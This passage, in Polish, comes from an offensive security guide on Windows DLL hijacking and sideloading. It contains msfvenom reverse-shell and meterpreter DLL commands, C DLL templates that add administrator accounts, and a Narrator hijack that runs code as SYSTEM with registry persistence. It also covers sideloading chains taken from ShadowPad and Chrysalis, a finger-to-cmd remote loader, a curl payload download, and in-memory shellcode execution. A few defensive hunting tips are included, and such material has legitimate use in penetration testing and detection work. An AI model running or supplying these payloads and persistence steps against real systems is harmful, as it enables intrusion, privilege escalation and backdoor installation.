Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz proksować, a następnie **wygenerować proksowaną dll**, albo **wskazać DLL** i **wygenerować proksowaną dll**.

### **Meterpreter**

**Uzyskaj rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Uzyskaj meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Utwórz użytkownika (x86, nie znalazłem wersji x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Własne

W wielu przypadkach skompilowany przez Ciebie DLL musi **eksportować każdą funkcję importowaną przez proces ofiary**. Jeśli brakuje wymaganego eksportu, plik binarny nie może go rozpoznać, a exploit kończy się niepowodzeniem.

<details>
<summary>Szablon DLL w C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternatywna biblioteka DLL w C z punktem wejścia wątku</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Dostępność/ATs)

Windows Narrator.exe nadal przy uruchomieniu sprawdza przewidywalną, zależną od języka bibliotekę DLL lokalizacji, którą można przejąć, aby uzyskać możliwość wykonania dowolnego kodu i zapewnić trwałość.<sup>[[7]](#references)</sup>

Najważniejsze fakty
- Ścieżka sprawdzana w bieżących kompilacjach: `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Starsza ścieżka (starsze kompilacje): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli w ścieżce OneCore znajduje się zapisywalna biblioteka DLL kontrolowana przez atakującego, zostanie załadowana i wykona się `DllMain(DLL_PROCESS_ATTACH)`. Nie są wymagane żadne eksporty.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` i `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i zaobserwuj próbę załadowania powyższej ścieżki.

Minimalna biblioteka DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Cicha praca w OPSEC
- Naiwny hijack może emitować dźwięki/podświetlać elementy UI. Aby działać dyskretnie, po dołączeniu wylicz wątki Narratora, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go za pomocą `SuspendThread`; kontynuuj działanie we własnym wątku. Pełny kod znajdziesz w PoC.<sup>[[8]](#references)</sup>

Wyzwalanie i trwałość przez konfigurację ułatwień dostępu
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Dzięki temu uruchomienie Narratora załaduje umieszczoną DLL. Na bezpiecznym pulpicie (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL wykona się jako SYSTEM na bezpiecznym pulpicie.

Uruchamianie kodu jako SYSTEM przez RDP (ruch lateralny)
- Włącz klasyczną warstwę zabezpieczeń RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się z hostem przez RDP, a na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL wykona się jako SYSTEM na bezpiecznym pulpicie.
- Wykonywanie kodu zakończy się po zamknięciu sesji RDP — szybko wykonaj inject/migrate.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego narzędzia ułatwień dostępu (AT), np. CursorIndicator, zmienić go tak, aby wskazywał dowolny plik binarny/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. Pozwala to uruchamiać dowolny kod za pośrednictwem frameworka Accessibility.

Uwagi
- Zapis do `%windir%\System32` i zmiana wartości HKLM wymagają uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; eksporty nie są potrzebne.

## Studium przypadku: CVE-2025-1729 - eskalacja uprawnień za pomocą TPQMAssistant.exe

Ten przypadek pokazuje **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` znajduje się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zaplanowane zadanie**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Uprawnienia do katalogu**: Można w nim zapisywać jako `CREATOR OWNER`, co pozwala użytkownikom lokalnym umieszczać dowolne pliki.
- **Zachowanie podczas wyszukiwania DLL**: Program najpierw próbuje załadować `hostfxr.dll` z katalogu roboczego i zapisuje w logu komunikat "NAME NOT FOUND", co wskazuje na pierwszeństwo wyszukiwania w katalogu lokalnym.

### Implementacja exploita

Atakujący może umieścić w tym samym katalogu złośliwy plik-stub `hostfxr.dll`, wykorzystując brakującą DLL do wykonania kodu w kontekście użytkownika:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Przebieg ataku

1. Jako standardowy użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli w chwili uruchomienia zadania zalogowany jest administrator, złośliwy DLL uruchomi się w sesji administratora z poziomem integralności medium.
4. Połącz standardowe techniki obejścia UAC, aby uzyskać uprawnienia SYSTEM z poziomu integralności medium.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading przez podpisany plik hosta (wsc_proxy.exe)

Podmioty stanowiące zagrożenie często łączą droppery oparte na MSI z DLL side-loadingiem, aby uruchamiać payloady w zaufanym, podpisanym procesie.<sup>[[10]](#references)</sup>

Przegląd łańcucha
- Użytkownik pobiera plik MSI. CustomAction uruchamia się po cichu podczas instalacji z GUI (np. LaunchApplication lub akcja VBScript) i odtwarza kolejny etap z osadzonych zasobów.
- Dropper zapisuje w tym samym katalogu prawidłowy, podpisany plik EXE oraz złośliwy DLL (przykładowa para: podpisany przez Avast wsc_proxy.exe + kontrolowany przez atakującego wsc.dll).
- Po uruchomieniu podpisanego pliku EXE kolejność wyszukiwania DLL w Windows powoduje najpierw załadowanie wsc.dll z katalogu roboczego, co uruchamia kod atakującego w podpisanym procesie nadrzędnym (ATT&CK T1574.001).

Analiza MSI (na co zwrócić uwagę)
- Tabela CustomAction:
  - Szukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication uruchamiający osadzony plik w tle.
  - W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Osadzone/podzielone payloady w pliku CAB MSI:
  - Wypakowanie administracyjne: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Możesz też użyć lessmsi: lessmsi x package.msi C:\out
  - Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez CustomAction w VBScript. Typowy przebieg:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktyczny sideloading z użyciem wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
  - wsc_proxy.exe: legalny, podpisany host (Avast). Proces próbuje załadować plik wsc.dll z katalogu, używając jego nazwy.
  - wsc.dll: DLL atakującego. Jeśli nie są wymagane konkretne eksporty, wystarczy DllMain; w przeciwnym razie utwórz proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Utwórz minimalny payload DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- W przypadku wymagań dotyczących eksportów użyj frameworka proxy (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, który również wykonuje Twój payload.

- Ta technika opiera się na rozpoznawaniu nazw DLL przez plik binarny hosta. Jeśli host używa ścieżek bezwzględnych lub bezpiecznych flag ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i przekazywane eksporty mogą wpływać na kolejność rozpoznawania, dlatego należy je uwzględnić przy wyborze pliku binarnego hosta i zestawu eksportów.

## Podpisane triady + zaszyfrowane payloady (studium przypadku ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad, używając **triady trzech plików**, aby upodobnić się do legalnego oprogramowania, a jednocześnie przechowywać główny payload w postaci zaszyfrowanej na dysku:<sup>[[12]](#references)</sup>

1. **Podpisany host EXE** – wykorzystywane są pliki takich dostawców jak AMD, Realtek czy NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę pliku wykonywalnego, aby przypominał plik binarny Windows (na przykład `conhost.exe`), ale podpis Authenticode pozostaje ważny.
2. **Złośliwy loader DLL** – umieszczany obok pliku EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL to zazwyczaj plik binarny MFC zaciemniony za pomocą frameworka ScatterBrain; jego jedynym zadaniem jest odnalezienie zaszyfrowanego bloba, odszyfrowanie go i refleksyjne załadowanie ShadowPad.
3. **Zaszyfrowany blob payloadu** – często przechowywany w tym samym katalogu jako `<name>.tmp`. Po zmapowaniu odszyfrowanego payloadu w pamięci loader usuwa plik TMP, aby zniszczyć ślady kryminalistyczne.

Uwagi dotyczące technik operacyjnych:

* Zmiana nazwy podpisanego pliku EXE (z zachowaniem oryginalnej wartości `OriginalFileName` w nagłówku PE) pozwala podszyć się pod plik binarny Windows i zachować podpis dostawcy. Odtwórz więc zwyczaj Ink Dragon polegający na umieszczaniu plików wyglądających jak `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ plik wykonywalny pozostaje zaufany, w przypadku większości mechanizmów allowlistingu wystarczy umieścić złośliwą DLL obok niego. Skup się na dostosowaniu loader DLL; podpisany plik nadrzędny może zazwyczaj działać bez zmian.
* Deszyfrator ShadowPad oczekuje, że blob TMP będzie znajdował się obok loadera i będzie można go zapisywać, aby po zmapowaniu wyzerować plik. Pozostaw katalog z prawem zapisu do czasu załadowania payloadu; gdy znajdzie się już w pamięci, plik TMP można bezpiecznie usunąć ze względów OPSEC.

### Łańcuch sideloadingu z użyciem LOLBAS stagera i archiwum etapowego (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, dzięki czemu jedynym niestandardowym artefaktem na dysku jest złośliwa DLL umieszczona obok zaufanego pliku EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Ukryty PowerShell uruchamia `cmd.exe /c`, pobiera polecenia z serwera Finger i przekazuje je do `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` pobiera tekst przez TCP/79; `| cmd` wykonuje odpowiedź serwera, pozwalając operatorom zmieniać serwer second stage.

- **Wbudowane pobieranie i rozpakowywanie:** Pobierz archiwum z nieszkodliwym rozszerzeniem, rozpakuj je i umieść sideload target oraz DLL w losowym folderze `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ukrywa pasek postępu i podąża za przekierowaniami; `tar -xf` używa wbudowanego w Windows narzędzia `tar`.

- **Uruchamianie przez WMI/CIM:** Uruchom plik EXE przez WMI, aby telemetria pokazywała proces utworzony przez CIM podczas ładowania znajdującej się obok biblioteki DLL:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Działa z plikami binarnymi, które preferują lokalne DLL (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod zaufaną nazwą.

- **Hunting:** Generuj alerty, gdy `forfiles` używa jednocześnie `/p`, `/m` i `/c`; poza skryptami administratorów jest to rzadko spotykane.


## Studium przypadku: sideload DLL przez NSIS dropper + Bitdefender Submission Wizard (Chrysalis)

Podczas niedawnego włamania Lotus Blossom nadużyto zaufanego łańcucha aktualizacji, aby dostarczyć dropper spakowany za pomocą NSIS, który przygotowywał sideload DLL oraz payloady działające w całości w pamięci.<sup>[[13]](#references)</sup>

Przebieg działań
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, umieszcza w nim zmienioną nazwę pliku Bitdefender Submission Wizard `BluetoothService.exe`, złośliwy `log.dll` i zaszyfrowany blob `BluetoothService`, a następnie uruchamia plik EXE.
- Host EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` ładuje blob za pomocą mmap; `LogWrite` odszyfrowuje go niestandardowym strumieniem opartym na LCG (stałe **0x19660D** / **0x3C6EF35F**, materiał klucza wyprowadzony z wcześniejszego hasha), nadpisuje bufor tekstem jawnym shellcode’u, zwalnia pamięć tymczasową i przekazuje mu wykonanie.
- Aby uniknąć IAT, loader rozwiązuje API, haszując nazwy eksportów za pomocą **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, a następnie stosując operację avalanche w stylu Murmur (**0x85EBCA6B**) i porównując wynik z docelowymi hashami z solą.

Główny shellcode (Chrysalis)
- Odszyfrowuje główny moduł podobny do PE, wykonując przez pięć przebiegów powtarzane operacje dodawania/XOR/odejmowania z kluczem `gQ2JR&9;`, a następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć rozwiązywanie importów.
- Odtwarza nazwy DLL w czasie działania za pomocą transformacji obracających bity i XOR dla każdego znaku, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Korzysta z drugiego resolvera, który przechodzi po **PEB → InMemoryOrderModuleList**, parsuje każdą tablicę eksportów w blokach 4-bajtowych, stosując mieszanie w stylu Murmur, i używa `GetProcAddress` tylko wtedy, gdy nie znajdzie hasha.

Osadzona konfiguracja i C2
- Konfiguracja znajduje się w upuszczonym pliku `BluetoothService` pod **offset 0x30808** (rozmiar **0x980**) i jest odszyfrowywana przez RC4 z kluczem `qwhvb^435h&*7`, co ujawnia URL C2 i User-Agent.
- Beacony tworzą rozdzielony kropkami profil hosta, dodają na początku tag `4Q`, a następnie szyfrują go RC4 kluczem `vAuig34%^325hGV` przed wywołaniem `HttpSendRequestA` przez HTTPS. Odpowiedzi są odszyfrowywane przez RC4 i obsługiwane przez przełącznik tagów (`4T` shell, `4V` uruchomienie procesu, `4W/4X` zapis pliku, `4Y` odczyt/eksfiltracja, `4\\` odinstalowanie, `4` enumeracja dysków/plików + przypadki transferu porcjowanego).
- Tryb wykonania zależy od argumentów CLI: brak argumentów = instalacja persistence (usługa/klucz Run) wskazującego na `-i`; `-i` ponownie uruchamia samego siebie z `-k`; `-k` pomija instalację i uruchamia payload.

Zaobserwowano alternatywny loader
- W ramach tego samego włamania umieszczono Tiny C Compiler i uruchomiono `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, a obok niego znajdował się `libtcc.dll`. Dostarczony przez atakującego kod źródłowy C zawierał shellcode, który skompilowano i uruchomiono w pamięci, bez zapisywania pliku PE na dysku. Odtwórz to za pomocą:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Ten oparty na TCC etap kompilacji i uruchomienia importował w czasie działania `Wininet.dll` i pobierał drugi etap shellcode’u ze sztywno zakodowanego adresu URL, zapewniając elastyczny loader podszywający się pod uruchomienie kompilatora.

## Sideloading podpisanego hosta z proxy exportów i uśpieniem wątku hosta

Niektóre łańcuchy DLL sideloading dodają **mechanizmy zwiększające stabilność**, aby legalny host działał wystarczająco długo i poprawnie ładował kolejne etapy, zamiast ulec awarii po załadowaniu złośliwej biblioteki DLL.<sup>[[11]](#references)</sup>

Zaobserwowany schemat
- Umieść zaufany plik EXE obok złośliwej biblioteki DLL, używając oczekiwanej nazwy zależności, takiej jak `version.dll`.
- Złośliwa biblioteka DLL **proxy’uje każdy oczekiwany export** do prawdziwej systemowej biblioteki DLL (na przykład `%SystemRoot%\\System32\\version.dll`), dzięki czemu rozwiązywanie importów nadal działa, a proces hosta zachowuje sprawność.
- Po załadowaniu złośliwa biblioteka DLL **modyfikuje punkt wejścia hosta**, aby główny wątek trafiał do nieskończonej pętli `Sleep`, zamiast kończyć działanie lub wykonywać ścieżki kodu, które zakończyłyby proces.
- Nowy wątek wykonuje właściwe złośliwe działania: odszyfrowuje nazwę lub ścieżkę biblioteki DLL kolejnego etapu (często używane są RC4/XOR), a następnie uruchamia ją za pomocą `LoadLibrary`.

Dlaczego to ma znaczenie
- Zwykłe proxy’owanie DLL zachowuje zgodność API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo, aby załadować kolejne etapy.
- Uśpienie głównego wątku za pomocą `Sleep(INFINITE)` to prosty sposób na utrzymanie podpisanego procesu podczas gdy loader wykonuje deszyfrowanie, przygotowuje kolejne etapy lub inicjuje połączenie sieciowe w wątku roboczym.
- Analiza skupiona wyłącznie na podejrzanym `DllMain` może przeoczyć ten schemat, jeśli interesujące zachowanie następuje po zmodyfikowaniu punktu wejścia hosta i uruchomieniu dodatkowego wątku.

Minimalny przebieg
1. Skopiuj podpisany plik EXE hosta i ustal, którą bibliotekę DLL ładuje z lokalnego katalogu.
2. Zbuduj proxy DLL eksportującą te same funkcje i przekazującą wywołania do legalnej biblioteki DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz wątek roboczy.
4. Z tego wątku zmodyfikuj punkt wejścia hosta lub procedurę startową głównego wątku, tak aby wykonywał pętlę z `Sleep`.
5. Odszyfruj nazwę/konfigurację biblioteki DLL kolejnego etapu i wywołaj `LoadLibrary` albo ręcznie zamapuj payload.

Wskazówki dla obrony
- Podpisane procesy ładujące `version.dll` lub podobne, często używane biblioteki z własnego katalogu aplikacji zamiast z `System32`.
- Modyfikacje pamięci w punkcie wejścia procesu krótko po załadowaniu obrazu, zwłaszcza skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Wątki tworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` dla drugiej biblioteki DLL o odszyfrowanej nazwie.
- Proxy DLL eksportujące wszystkie funkcje, umieszczane obok plików wykonywalnych dostawców w zapisywalnych katalogach stagingowych, takich jak `ProgramData`, `%TEMP%` lub ścieżki rozpakowanych archiwów.

## References

- [1] [Red Canary – Wnioski wywiadowcze: styczeń 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Eskalacja uprawnień z użyciem TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking w Windows. Prosty przykład w C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore wdraża nowe malware wymierzone w Europę](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: gdy DLL hijack spotyka narzędzia pomocnicze Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Cyfrowi sobowtórowie: analiza ewoluujących kampanii podszywania się, które rozpowszechniają Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zbieżne interesy: analiza klastrów zagrożeń atakujących rząd kraju Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Wewnątrz Ink Dragon: sieć przekaźnikowa i kulisy skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: szczegółowa analiza zestawu narzędzi Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: łańcuch ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Śledzenie kampanii szpiegowskich irańskiego APT Screening Serpens z 2026 roku](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Szybcy i wściekli: działania Nimbus Manticore podczas konfliktu irańskiego](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Akcje zadań](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 atakuje rządy i infrastrukturę krytyczną w Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
